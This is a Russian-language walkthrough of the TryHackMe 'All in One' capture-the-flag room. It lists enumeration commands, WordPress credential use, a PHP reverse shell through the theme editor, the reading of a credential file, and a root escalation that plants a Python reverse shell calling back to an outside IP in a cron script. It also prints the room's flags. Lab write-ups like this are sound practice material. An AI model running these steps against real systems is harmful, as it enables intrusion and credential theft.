[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [All in One](https://tryhackme.com/r/room/allinonemj) 

Всего 1 заданиe:
## Задание 1
Цель этого ящика — помочь вам попрактиковаться в нескольких способах эксплуатации системы. Существует несколько 
преднамеренных путей для ее эксплуатации и несколько непреднамеренных путей для получения root-доступа.

Попробуйте обнаружить и использовать их все. Не просто используйте его, используя предполагаемые пути, взламывайте 
как профессионал и наслаждайтесь коробкой! 

Дайте машине около 5 минут для полной загрузки.

Твиттер: i7m4d

### Ответьте на вопросы ниже
пользователь.txt
```commandline
nmap -sC -sV <IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
curl http://<IP>/hackathons
# Encrypted string: Dvc W@iyur@123
# Key: KeepGoing
# Decrypted string: Try H@ckme@123

wpscan --url http://<IP>/wordpress/ -e u
elyana:H@ckme@123
# http://<IP>/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty
# PHP reverse shell
nc -nlvp 4444
python3 -c "import pty;pty.spawn('/bin/bash')"
find / -user elyana -type f 2>/dev/null
cat /etc/mysql/conf.d/private.txt
# user: elyana
# password: E@syR18ght
sshpass -p "E@syR18ght" ssh elyana@<IP>
cat user.txt
echo "VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259" | base64 -d
```
```commandline
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
```
корень.txt
```commandline
cat /etc/crontab
vim /var/backups/script.sh

#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
nc -nlvp 4444
cat /root/root.txt | base64 -d
```
```commandline
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)